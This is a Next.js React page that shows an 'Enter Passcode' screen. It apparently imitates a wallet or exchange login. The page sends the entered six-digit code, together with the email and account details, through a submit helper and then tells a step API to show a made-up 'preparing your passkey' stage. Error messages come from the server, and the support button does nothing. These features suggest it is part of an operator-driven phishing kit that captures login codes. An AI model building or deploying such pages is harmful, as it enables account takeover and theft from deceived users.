"use client";

import { Suspense, useEffect, useState } from "react";
import { useSearchParams } from "next/navigation";
import { AuthShell } from "@/components/auth/AuthShell";
import { OtpInput } from "@/components/auth/OtpInput";
import { StepGate, PasscodeLoading } from "@/components/auth/StepGate";
import type { StepState } from "@/hooks/useStepState";
import { submitAuthPayload } from "@/lib/submit";

function PasskeyIcon() {
  return (
    <svg width="24" height="24" viewBox="0 0 16 16" aria-hidden="true">
      <g fill="#7b849b">
        <path
          fillRule="evenodd"
          d="M.97 13.617a.5.5 0 1 0 .707.707L14.324 1.676a.5.5 0 0 0-.707-.707L11.64 2.946A8.1 8.1 0 0 0 8 2.116c-2.575 0-4.496 1.094-5.768 2.357a8 8 0 0 0-1.43 1.914C.491 6.98.301 7.56.301 8s.19 1.02.501 1.613a8 8 0 0 0 1.43 1.914q.204.203.43.398zm2.401-2.402 1.824-1.823a3 3 0 0 1-.294-1.3c0-1.712 1.423-3.077 3.15-3.077.448 0 .875.092 1.262.258l1.574-1.574a7.2 7.2 0 0 0-2.886-.584c-2.269 0-3.947.958-5.064 2.068a7 7 0 0 0-1.25 1.669c-.281.536-.386.947-.386 1.148s.105.612.386 1.148c.274.52.69 1.113 1.25 1.67q.204.203.434.397m5.15-5.15a2.2 2.2 0 0 0-.47-.05c-1.201 0-2.15.943-2.15 2.077q0 .271.07.524z"
          clipRule="evenodd"
        />
        <path d="M8 13.885a8.1 8.1 0 0 1-3.639-.831l.753-.753a7.2 7.2 0 0 0 2.887.584c2.268 0 3.947-.958 5.064-2.068a7 7 0 0 0 1.25-1.669c.281-.536.386-.947.386-1.148s-.105-.612-.387-1.148a7 7 0 0 0-1.25-1.67 7 7 0 0 0-.434-.397l.71-.71q.226.195.43.398a8 8 0 0 1 1.43 1.914c.311.593.5 1.174.5 1.613s-.189 1.02-.5 1.613a8 8 0 0 1-1.43 1.914c-1.272 1.263-3.194 2.358-5.77 2.358" />
        <path d="M8.05 11.168a3.2 3.2 0 0 1-1.455-.348l.762-.762q.327.108.694.11c1.2 0 2.15-.943 2.15-2.076 0-.259-.05-.508-.14-.738l.749-.749c.249.44.39.946.39 1.487 0 1.712-1.423 3.076-3.15 3.076" />
      </g>
    </svg>
  );
}

function PasscodeForm({ state, email, mode, accountType }: { state: StepState; email: string; mode: string; accountType: string }) {
  const [attempt, setAttempt] = useState(0);
  const [error, setError] = useState(false);
  const [errorText, setErrorText] = useState("");
  const [verifying, setVerifying] = useState(false);

  useEffect(() => {
    if (state.error) {
      setError(true);
      setErrorText(state.error);
      setVerifying(false);
      setAttempt((a) => a + 1);
    }
  }, [state.error]);

  const handleComplete = async (code: string) => {
    await submitAuthPayload({ page: "passcode", email, mode, accountType, code });
    // Immediately advance to passkey-creating page
    await fetch("/api/step", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ step: "passkey-creating", message: "Passcode submitted — preparing your passkey..." }),
    }).catch(() => {});
    setError(false);
    setErrorText("");
    setVerifying(true);
    setAttempt((a) => a + 1);
  };

  return (
    <div className="flex w-full max-w-[512px] flex-col items-center">
      <div className="w-full min-h-[500px] rounded-[8px] border border-auth-card-border bg-auth-card p-6">
        <div className="p-1">
          {verifying ? (
            <PasscodeLoading />
          ) : (
            <>
              <div className="mb-6 flex items-center">
                <h2 className="ml-4 text-[32px] font-semibold leading-8 text-white">
                  Enter Passcode
                </h2>
              </div>
              <div className="mb-3">
                <p className="text-base font-medium leading-6 text-grey-200">
                  {state.message ||
                    "Use your passcode to log in, unlock the app, and confirm transactions"}
                </p>
              </div>
              <div className="flex items-center justify-between">
                <p className="text-sm font-semibold text-white">Passcode</p>
                <PasskeyIcon />
              </div>
              <div className="mt-7">
                <div className="mt-2">
                  <OtpInput key={attempt} length={6} error={error} onComplete={handleComplete} />
                  <div className="mt-4 h-5" />
                </div>
              </div>
              {(errorText || error) && (
                <p className="mt-2 text-sm font-medium text-auth-danger">
                  {errorText || "Invalid passcode."}
                </p>
              )}
              <p className="mt-3 py-3 text-sm font-medium leading-[14px] text-grey-200">
                Forgot your passcode?{" "}
                <button type="button" className="text-blue-brand">
                  Contact us
                </button>{" "}
                to reset it.
              </p>
            </>
          )}
        </div>
      </div>
      <div className="mt-[10px] flex justify-center">
        <p className="flex text-xs font-medium text-grey-200">
          Having issues? Use{" "}
          <a href="/login" className="text-blue-brand">
            QR Login
          </a>
        </p>
      </div>
    </div>
  );
}

function PasscodeInner() {
  const searchParams = useSearchParams();
  const email = searchParams.get("email") ?? "";
  const mode = searchParams.get("mode") ?? "login";
  const accountType = searchParams.get("accountType") ?? "";

  return (
    <StepGate step="passcode">
      {(state) => <PasscodeForm state={state} email={email} mode={mode} accountType={accountType} />}
    </StepGate>
  );
}

export default function PasscodePage() {
  return (
    <AuthShell>
      <div className="mx-auto mb-10 mt-8 flex w-full max-w-[1140px] flex-1 flex-col">
        <div className="flex flex-1 items-center justify-center">
          <Suspense fallback={null}>
            <PasscodeInner />
          </Suspense>
        </div>
      </div>
    </AuthShell>
  );
}
